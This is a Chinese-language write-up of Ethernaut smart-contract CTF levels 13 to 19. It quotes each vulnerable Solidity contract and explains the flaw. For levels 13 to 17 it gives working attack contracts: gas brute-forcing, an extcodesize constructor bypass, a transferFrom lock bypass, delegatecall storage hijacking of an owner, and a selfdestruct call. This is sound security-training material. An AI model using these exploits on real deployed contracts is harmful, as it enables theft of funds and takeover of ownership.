# Ethernaut靶场刷题记录(13-19)

    author: 甘赞栩

## 13 Gatekeeper One
这关主要是考查对solidity合约基础知识的了解。
先看代码：
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```
题目想要我们执行enter方法，并且要通过三个修饰器的检查。<br/>
我们把三个修饰器分开来分析：
  * require(msg.sender != tx.origin);
    这个条件我们再之前做题的时候遇到过，只需要再调用函数时增加一个中间函数，就可以使`msg.sender != tx.origin`
  * require(gasleft().mod(8191) == 0);这个条件会比较麻烦一点，gasleft函数返回的是交易剩余的gas量，所以我们只要让gas为8191*n+x即可，其中x为我们此次交易所消耗的gas。理论上来讲可以通过debug得到，但是由于不知道目标合约的编译器版本，所以无法精准得到这个值。但我们可以通过gas爆破来解决。毕竟gas毕竟是在一个范围区间之中的。
  * require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)));
    require(uint32(uint64(_gateKey)) != uint64(_gateKey));
    require(uint32(uint64(_gateKey)) == uint16(tx.origin));
    这个条件要求我们先了解solidity中类型转换的规则[参考链接](https://www.tutorialspoint.com/solidity/solidity_conversions.htm#:~:text=Solidity%20compiler%20allows%20implicit%20conversion,value%20not%20allowed%20in%20uint256.)<br/>
    这里以_gateKey是0x12345678deadbeef为例说明

    >1. uint32(uint64(_gateKey))转换后会取低位，所以变成0xdeadbeef，uint16(uint64(_gateKey))同理会变成0xbeef，uint16和uint32在比较的时候，较小的类型uint16会在左边填充0，也就是会变成0x0000beef和0xdeadbeef做比较，因此想通过第一个require只需要找一个形为0x????????0000????这种形式的值即可，其中?是任取值。
    >2. 第二步要求双方不相等，只需高4个字节中任有一个bit不为0即可
    >3. 通过前面可知，uint32(uint64(_gateKey))应该是类似0x0000beef这种形式，所以只需要让最低的2个byte和tx.origin地址最低的2个byte相同即可，也就是，key的最低2个字节设置为合约地址的低2个字节。这里tx.origin就是metamask的账户地址

    攻击合约：
    ```
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    interface GatekeeperOne {
        function entrant() external returns (address);
        function enter(bytes8 _gateKey) external returns (bool);
    }

    contract attack {
        GatekeeperOne gatekeeperOne;
        address target;
        address entrant;

        event log(bool);
        event logaddr(address);

        constructor(address _addr) public {
            // 设置为题目地址
            target = _addr;
        }

        function exploit() public {
            // 后四位是metamask上账户地址的低2个字节
            bytes8 key=0xAAAAAAAA0000Ff67;
            bool result;
            for (uint256 i = 0; i < 120; i++) {//gas爆破
                (bool result, bytes memory data) = address(target).call{gas:i + 150 + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)",key));
                if (result) {
                    break;
                }
            }
            emit log(result);
        }

        function getentrant() public {
            gatekeeperOne = GatekeeperOne(target);
            entrant = gatekeeperOne.entrant();
            emit logaddr(entrant);
        }
    }
    ```

  * 解题步骤
  执行exploit方法后执行getentrant,可以在交易详细中看到提交上来的事务中address已经为我们的地址。通关

## Gatekeeper Two
在做了第一道守门人后，这道题目看起来就easy很多了
先看代码
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```
一样的有三个函数修饰器需要满足，我们依旧分开来说
* **require(msg.sender != tx.origin);**
  这个和上一个的第一个条件一样，不再赘述，建一个合约就行。
* **uint x**
  **assembly { x := extcodesize(caller()) }**
  **require(x == 0);**
  这里涉及到了solidity中的汇编语言，[参考文档](https://solidity-cn.readthedocs.io/zh/develop/assembly.html#)，在这里`caller`是调用的发起者，`extcodesize(a)`会返回地址 a 的代码大小。
  关于这点，需要使用一个特性绕过：当合约正在执行构造函数constructor并部署时，其extcodesize为0。换句话说，如果我们在constructor中调用这个函数的话，那么extcodesize(caller())返回0，因此可以绕过检查。

*  **require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);**
  这个条件其实就是一个简单的异或，我们只需要反过来异或一次算出来的结果就是key<br/>

攻击合约:
```
pragma solidity ^0.6.0;

contract attack{
    address target;
    constructor(address _adr) public{
        target = _adr;
        bytes8 password = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^  uint64(0) - 1);
        target.call(abi.encodeWithSignature("enter(bytes8)",password));
    }
    
}
```
## 15 Naught Coin
这关考查对ERC20的了解
先看代码
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.2.0/contracts/token/ERC20/ERC20.sol";

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = now + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) ERC20('NaughtCoin', '0x0') public {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      _;
    } else {
     _;
    }
  } 
} 
```
光看这个函数修饰器是没有漏洞可言的，但问题是，ERC20有两个转账函数，题目中只对`transfer`这一个函数做了修饰，也就是说，我们可以使用另一个函数进行转账-`transferFrom`
* 解题步骤
  直接在控制台操作即可，但要注意，在转账操作之前我们需要先approve
  val='1000000000000000000000000'
  addr='0x5B38Da6a701c568545dCfcB03FcB875f56beddC4'
  1. contract.approve(player,val)
  2. contract.transferFrom(player,addr,val)

## 16 Preservation
这关是对delegatecall漏洞的考查，大家可以看我对delegatecall的另一篇文章[delegatecall杂谈](../Delegatecall.html)
先看代码：
```
/ SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```
由于delegatecall的执行环境是当前合约，所以如果要调用的函数内有修改变量的操作，将会导致自身的**对应储存位上**的变量被恶意修改，具体可以参考我的另一篇博客。<br/>
利用这一点，我们可以实现攻击：
```
pragma solidity ^0.6.0;

contract attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint _time) public {
        owner = address(_time);
    }
```
由于在perservation里，owner是在第2个存储位，所以我们这里需要两个变量来"占位",这样就可以做到恶意修改被攻击合约的owner的目的。

* 解题步骤
1. 执行`setFirstTime`函数，将我们的攻击合约地址作为参数传进去，可以看到此时timeZone1Library已经变为我们攻击合约的地址。
![](../images/ethernaut/e16/1.jpg)
![](../images/ethernaut/e16/2.jpg)
2. 再次执行`setFirstTime`，此时调用的就是我们的攻击合约了，我们只需要把我们自己的地址作为参数传进去，就可以完成攻击。

## 17 Recovery
这关考查对区块链浏览器的使用和destroy函数
先看代码
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol";

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  
  }
}

contract SimpleToken {

  using SafeMath for uint256;
  // public variables
  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value.mul(10);
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender].sub(_amount);
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
```
题目中给到了一个合约地址，是`Recovery`的地址，题目中说创建者通过Recovery创建了一个SimpleToken，然后把地址给忘了，要我们找到这个地址并且把里面的钱弄出来。很容易，通过区块链浏览器就可以找到他创建的`SimpleToken`。<br/>
在 https://rinkeby.etherscan.io/ 上搜索Recovery的地址，然后我们就可以看到他的创建合约交易，点进去就可以找到合约地址。
![](../images/ethernaut/e17/1.jpg)
得到地址后，我们只需要执行合约的自毁函数即可<br/>
攻击合约：
```
pragma solidity ^0.6.0;
contract attack{
    address payable target;
    address payable owner;
    constructor(address payable _target, address payable _own) public{
        target = _target;
        owner = _own;
    }

    function dosome() public {
        target.call(abi.encodeWithSignature("destroy(address)",owner));
    }
}
```
>在执行dosome()方法的时候最好把交易的gaslimit调高一点，我在执行时如果不调gaslimit是会执行失败的，如图：
![](../images/ethernaut/e17/2.jpg)

## 18 Magic Number
这是一个考察solidity操作码的题目
先看代码：
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract MagicNum {

  address public solver;

  constructor() public {}

  function setSolver(address _solver) public {
    solver = _solver;
  }

  /*
    ____________/\\\_______/\\\\\\\\\_____        
     __________/\\\\\_____/\\\///////\\\___       
      ________/\\\/\\\____\///______\//\\\__      
       ______/\\\/\/\\\______________/\\\/___     
        ____/\\\/__\/\\\___________/\\\//_____    
         __/\\\\\\\\\\\\\\\\_____/\\\//________   
          _\///////////\\\//____/\\\/___________  
           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
            ___________\///_____\///////////////__
  */
}
```
部署一个只有 10 个 opcode 的合约，该合约在调用后返回 42。
因此我们必须使用字节码手动编写一个程序

## 19 Alien Codex
又是一道关于内存布局的题目
